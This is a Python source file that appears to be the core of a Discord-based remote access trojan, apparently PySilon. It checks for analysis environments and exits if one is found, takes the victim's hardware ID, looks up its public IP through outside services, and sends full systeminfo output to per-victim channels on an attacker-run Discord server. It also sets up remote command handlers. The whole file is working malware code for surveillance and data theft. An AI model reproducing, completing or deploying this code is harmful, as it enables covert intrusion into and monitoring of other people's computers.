import discord
import subprocess
from discord.ext import commands
from resources.modules.misc import *
from resources.modules.protections import *
from urllib.request import urlopen

if protection_check():
    os._exit(0)

client = commands.Bot(command_prefix=['.'], intents=discord.Intents.all(), case_insensitive=True)

bot_token = ""
guild_id = int
channel_ids = {                                                    
    'info': '',                                                  
    'main': '',                                                                                                  
    'file': '',                                                                                                    
}

@client.event
async def on_ready():
    global channel_ids
    first_run = True

    hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
    for category_name in client.get_guild(guild_id).categories:
        if hwid in str(category_name):
            first_run, category = False, category_name
            break
    
    if not first_run:
        category_channel_names = []
        for channel in category.channels:
            category_channel_names.append(channel.name)

        if 'file-related' not in category_channel_names and channel_ids['file']: 
            temp = await client.get_guild(guild_id).create_text_channel('file', category=category)
            channel_ids['file'] = temp.id

    if first_run:
        category = await client.get_guild(guild_id).create_category(hwid)
        temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
        temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
        temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category); channel_ids['file'] = temp.id

        try: 
            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ident.me').read().decode('utf-8') + ' [ident.me]```')
        except: pass
        try:
            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8') + ' [lafibre.info]```')
        except: pass
        
        system_info = force_decode(subprocess.run('systeminfo', capture_output= True, shell= True).stdout).strip().replace('\\xff', ' ')
        
        chunk = ''
        for line in system_info.split('\n'):
            if len(chunk) + len(line) > 1990:
                await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
                chunk = line + '\n'
            else:
                chunk += line + '\n'
        await client.get_channel(channel_ids['info']).send('```' + chunk + '```')

    else:
        for channel in category.channels:
            if channel.name == 'info':
                channel_ids['info'] = channel.id
            elif channel.name == 'main':
                channel_ids['main'] = channel.id
            elif channel.name == 'file-related':
                channel_ids['file'] = channel.id

@client.command(name="ping")
async def bot_status(ctx):
    await client.get_channel(channel_ids['main']).send(ctx.author.mention)

@client.command(name="rm-category")
async def delete_category(ctx, category_id):
    if ctx.message.channel.id in channel_ids.values():
        try:
            category_id = int(category_id)
            category = discord.utils.get(ctx.guild.categories, id=category_id)
            if not category:
                await ctx.send('`' + category_id + ' is not a category!`')
                return
            for channel in category.channels:
                await channel.delete()
            await category.delete()
        except:
            await ctx.send('`An error has occurred.`')
    else:
        return

# [pysilon] commands